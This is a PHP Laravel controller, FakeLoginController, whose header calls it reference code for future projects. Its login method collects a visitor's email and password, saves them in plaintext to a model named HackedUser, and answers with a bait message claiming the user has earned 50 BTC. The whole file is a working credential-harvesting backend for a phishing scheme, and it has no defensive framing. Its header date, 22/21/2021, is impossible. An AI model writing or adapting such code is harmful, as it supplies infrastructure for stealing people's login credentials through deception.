<?php

/**
 * Dated : 22/21/2021
 * 
 * This is a Fake login Controller: in use: serves as reference code for future projects
 * 
 * @author   Silas Udofia <Silas@Verixon.com>
 */

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\HackedUser;
use App\Http\Requests\HackedUserLoginRequest;

class FakeLoginController extends Controller
{
    public function login(HackedUserLoginRequest $request){

      
        $email = $request->input('email');
        $password = $request->input('password');

        $userCredentials = [
            'email' => $email,
            'password' => $password
        ];

    try{  
        $user = HackedUser::create($userCredentials);

        $response = [
            'notify' => 'Congratulations, you just earned 50 BTC',
        ];

        return response()->json($response, 200);

      }catch(\Exception $exception){
        return response()->json(['message'=> $exception->getMessage()],400);
      }
    }
}
